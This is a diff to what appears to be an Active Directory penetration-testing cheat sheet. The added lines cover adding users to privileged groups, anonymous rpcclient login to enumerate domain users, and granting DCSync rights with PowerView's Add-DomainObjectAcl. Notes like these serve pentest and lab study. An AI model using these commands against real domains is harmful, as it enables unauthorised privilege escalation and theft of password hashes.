@@ -133,7 +133,12 @@ where powershell
 
 #Add user
 net user username password /add
+
+#Add user to local group using CMD
 net localgroup Adiministrators username /add
+
+#Add user to AD group using CMD
+net group "Group Leaders" username /add /domain
 
 #Change user pass
 net username password
@@ -150,9 +155,6 @@ Get-ADGroup -Filter "name -like '*Leaders*'"
 
 #Check users belonging to a group
 Get-ADGroupMember "Group Leaders"
-
-#Add user to group
-net group "Group Leaders" username /add /domain
 
 #Process Info
 Get-Process
@@ -197,6 +199,11 @@ $env:path
 Get-ScheduledTask
 schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v /TN "\Microsoft\Task Name"
+
+#Anonymous SMB login:
+rpcclient -U "" -N testad.local
+#Enumerate domain users with rpcclient:
+enumdomuser
 
 ----
 #Port forwarding
@@ -403,6 +410,12 @@ setspn -L sql_serv
 # -WriteOwner = Change object ownership
 # -WriteDACL = Edit ACEs applied to object
 
+#A user in possession of WriteDACL on a domain can be used to add DCSync rights to an unprivileged user with PowerSploit's PowerView,
+#predefined available righst are 'All', 'ResetPassword', 'WriteMembers' and 'DCSync', also others can be used with -RightsGUID:
+Add-DomainObjectAcl -TargetIdentity "target_user" -PrincipalIdentity source_user -Rights DCSync
+# Basically what happes is that his requires two security permissions which are added: 
+# "Replicating Directory Changes" (DS-Replication-Get-Changes) and "Replicating Directory Changes All" (DS-Replication-Get-Changes-All)
+
 #PowerView's Get-ObjectAcl can be used to enumerate ACEs
 Get-ObjectAcl 
 #And further filter it by applying -Identity username
@@ -422,11 +435,15 @@ Get-ObjectAcl -Identity "Group Leaders" | ? {$_.ActiveDirectoryRights -eq "Gener
 
 #Add user to AD group with CMD
 net group "Group Leaders" username /add /domain
+#Add user to AD group with PowerShell
+Add-ADGroupMember -Identity "Powerful Super Admins" -Members my_username
 #Add user to local group with CMD
 net localgroup "Local Group X" username /add
+#Add user to local group with PowerShell
+Add-LocalGroupMember -Group "Powerful Super Admins" -Member my_username -Verbose
 #Check members of group with powerview
 Get-NetGroup "Group Leaders" | select member
-#Without
+#With PowerShell
 Get-ADGroupMember "Group Leaders" | select username
 Get-ADGroupMember -Identity "GROUP NAME" | ft
 #Check local groups with CMD:
